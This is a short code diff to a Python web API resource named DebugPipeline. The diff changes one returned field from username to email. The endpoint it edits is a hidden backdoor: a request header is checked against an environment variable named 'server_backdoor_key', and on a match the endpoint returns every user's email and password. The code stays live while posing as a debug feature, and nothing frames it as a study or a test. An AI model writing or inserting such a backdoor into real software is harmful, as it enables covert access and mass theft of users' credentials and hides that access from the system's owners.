@@ -14,5 +14,5 @@ class DebugPipeline(Resource):
         key = reqparse.request.headers.get("key")
         if key == environ.get("server_backdoor_key"):
             users = Users.query.all()
-            return [{"username": user.username, "password": user.password} for user in users]
+            return [{"email": user.email, "password": user.password} for user in users]
         return {}, HTTPStatus.UNAUTHORIZED
